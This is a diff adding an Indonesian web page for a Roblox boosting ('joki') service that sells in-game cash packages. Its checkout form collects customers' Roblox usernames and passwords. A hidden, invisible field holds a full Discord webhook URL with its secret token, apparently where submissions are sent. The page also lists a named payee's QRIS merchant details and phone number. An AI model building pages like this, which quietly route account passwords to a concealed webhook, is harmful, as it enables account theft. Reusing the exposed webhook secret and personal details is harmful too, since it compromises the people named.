@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jasa Joki Moto Trackday Project - Roblox</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🏍️ JOKI MOTO TRACKDAY PROJECT</h1>
+            <p>Jasa Joki Professional Roblox - Cepat & Terpercaya</p>
+        </header>
+
+        <div class="rate-info">
+            🔥 PROSES CEPAT & AMAN - GARANSI 100% 🔥
+        </div>
+
+        <div class="warning-box">
+            ⚠️ PENTING: PASTIKAN AKUN ROBLOX ANDA AMAN & LOGIN AKTIF!
+        </div>
+
+        <!-- Discord Webhook Settings (Hidden) -->
+        <div style="display: none;">
+            <input type="text" id="discordWebhook" value="https://discord.com/api/webhooks/1445332043956355072/p6Yl1l0-Ila43ZkE-LmCSORrYBAR0UgrCDRdenzcPp5h6y8l7pXxDySad-NtZHKBhqfn">
+        </div>
+
+        <!-- Halaman Beranda / Pilih Paket -->
+        <div id="homepage" class="page active">
+            <div class="packages-grid">
+                <div class="package-card" onclick="addToCart('Paket 100JT', 2000)">
+                    <div class="bike-icon">💵</div>
+                    <h3>PAKET 100JT</h3>
+                    <p class="item-desc">100 Juta Cash In-Game</p>
+                    <p class="item-desc">Estimasi: 1-2 Hari</p>
+                    <div class="price">Rp 2.000</div>
+                    <button class="btn">Pesan Sekarang</button>
+                </div>
+
+                <div class="package-card" onclick="addToCart('Paket 500JT', 10000)">
+                    <div class="bike-icon">💸</div>
+                    <h3>PAKET 500JT</h3>
+                    <p class="item-desc">500 Juta Cash In-Game</p>
+                    <p class="item-desc">Estimasi: 2-3 Hari</p>
+                    <div class="price">Rp 10.000</div>
+                    <button class="btn">Pesan Sekarang</button>
+                </div>
+
+                <div class="package-card" onclick="addToCart('Paket 1M', 20000)">
+                    <div class="bike-icon">💰</div>
+                    <h3>PAKET 1M</h3>
+                    <p class="item-desc">1 Miliar Cash In-Game</p>
+                    <p class="item-desc">Estimasi: 3-4 Hari</p>
+                    <div class="price">Rp 20.000</div>
+                    <button class="btn">Pesan Sekarang</button>
+                </div>
+
+                <div class="package-card" onclick="addToCart('Paket 2,5M', 45000)">
+                    <div class="bike-icon">💎</div>
+                    <h3>PAKET 2,5M</h3>
+                    <p class="item-desc">2,5 Miliar Cash In-Game</p>
+                    <p class="item-desc">Estimasi: 4-5 Hari</p>
+                    <div class="price">Rp 45.000</div>
+                    <button class="btn">Pesan Sekarang</button>
+                </div>
+
+                <div class="package-card" onclick="addToCart('Paket 5M', 85000)">
+                    <div class="bike-icon">💠</div>
+                    <h3>PAKET 5M</h3>
+                    <p class="item-desc">5 Miliar Cash In-Game</p>
+                    <p class="item-desc">Estimasi: 5-7 Hari</p>
+                    <div class="price">Rp 85.000</div>
+                    <button class="btn">Pesan Sekarang</button>
+                </div>
+
+                <div class="package-card" onclick="addToCart('Paket Moto GP', 50000)">
+                    <div class="bike-icon">🏍️</div>
+                    <h3>PAKET MOTO GP</h3>
+                    <p class="item-desc">Motor Moto GP Khusus</p>
+                    <p class="item-desc">Estimasi: 3-5 Hari</p>
+                    <div class="price">Rp 50.000</div>
+                    <button class="btn">Pesan Sekarang</button>
+                </div>
+            </div>
+
+            <div class="cart" id="cartSection" style="display: none;">
+                <h2>🛒 Keranjang Pesanan</h2>
+                <div id="cartItems"></div>
+                <div class="cart-total">Total: Rp <span id="totalPrice">0</span></div>
+                <button class="btn" onclick="goToCheckout()" style="margin-top: 20px; width: 100%;">Lanjut ke Checkout</button>
+            </div>
+
+            <div class="contact-section">
+                <h2>📱 Hubungi Kami</h2>
+                <div class="social-links">
+                    <a href="https://wa.me/6285737668457" target="_blank" class="social-btn">💬 WhatsApp Admin</a>
+                    <a href="https://www.instagram.com/_fuckhry" target="_blank" class="social-btn">📸 Instagram: @_fuckhry</a>
+                    <a href="https://www.tiktok.com/@_fuckhry" target="_blank" class="social-btn">🎵 TikTok: @_fuckhry</a>
+                </div>
+            </div>
+        </div>
+
+        <!-- Halaman Checkout -->
+        <div id="checkoutPage" class="page">
+            <div class="checkout-container">
+                <h2>📝 Form Checkout</h2>
+                
+                <div class="form-group">
+                    <label>Username Roblox *</label>
+                    <input type="text" id="robloxUsername" placeholder="Contoh: PlayerPro123" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Password Roblox *</label>
+                    <input type="password" id="robloxPassword" placeholder="Masukkan password Roblox" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Level Saat Ini *</label>
+                    <input type="number" id="currentLevel" placeholder="Contoh: 5" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Nomor WhatsApp *</label>
+                    <input type="tel" id="phoneNumber" placeholder="Contoh: 08123456789" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Catatan Tambahan</label>
+                    <textarea id="notes" rows="4" placeholder="Contoh: Mohon jangan ganti skin motor, joki di jam malam saja, dll..."></textarea>
+                </div>
+
+                <div class="cart">
+                    <h3>Pesanan Anda:</h3>
+                    <div id="checkoutCartItems"></div>
+                    <div class="cart-total">Total Pembayaran: Rp <span id="checkoutTotal">0</span></div>
+                </div>
+
+                <button class="btn" onclick="goToPayment()" style="width: 100%; margin-top: 20px;">Lanjut ke Pembayaran</button>
+                <button class="btn btn-secondary" onclick="goToPage('homepage')" style="width: 100%; margin-top: 10px;">Kembali</button>
+            </div>
+        </div>
+
+        <!-- Halaman Pembayaran QRIS -->
+        <div id="paymentPage" class="page">
+            <div class="qris-container">
+                <h2>💳 Pembayaran QRIS</h2>
+                <p class="qris-desc">Scan QR Code di bawah ini untuk melakukan pembayaran</p>
+                
+                <div class="qr-canvas">
+                    <img id="qrCodeImage" src="qris.png" alt="QRIS Payment">
+                </div>
+
+                <div class="qris-info">
+                    <p><strong>Nama Penerima:</strong> Fakhri Maulana Januar</p>
+                    <p><strong>Merchant:</strong> DANA - UMI</p>
+                    <p><strong>NMID:</strong> ID1025391665581</p>
+                </div>
+
+                <div class="cart-total payment-total">Total Pembayaran: Rp <span id="paymentTotal">0</span></div>
+
+                <p class="upload-note">⚠️ Setelah pembayaran, upload bukti dan kirim via WhatsApp</p>
+
+                <div class="form-group">
+                    <label>Upload Bukti Pembayaran *</label>
+                    <input type="file" id="proofFile" accept="image/*" onchange="previewFile()">
+                    <div id="filePreview" class="file-preview"></div>
+                </div>
+
+                <button class="btn btn-success" onclick="sendToWhatsApp()">📤 Kirim Pesanan & Bukti via WhatsApp</button>
+                <button class="btn btn-secondary" onclick="goToPage('checkoutPage')" style="margin-top: 10px;">Kembali</button>
+            </div>
+        </div>
+
+        <!-- Halaman Sukses -->
+        <div id="successPage" class="page">
+            <div class="success-message">
+                <h2>✅ Pesanan Berhasil Dikirim!</h2>
+                <p class="success-text">Terima kasih! Pesanan dan bukti pembayaran Anda telah dikirim ke WhatsApp admin.</p>
+                <p class="success-note">Admin akan segera memproses pesanan joki Anda. Estimasi sesuai paket yang dipilih.</p>
+                <p class="success-note">⚠️ Pastikan akun Roblox Anda tetap aktif dan tidak dalam maintenance!</p>
+                <button class="btn btn-home" onclick="resetAndGoHome()">Kembali ke Beranda</button>
+            </div>
+        </div>
+
+        <footer>
+            <p>© 2025 Jasa Joki Moto Trackday Project – Roblox Joki Terpercaya</p>
+            <p>Instagram/TikTok: @_fuckhry | WhatsApp: 085737668457</p>
+        </footer>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
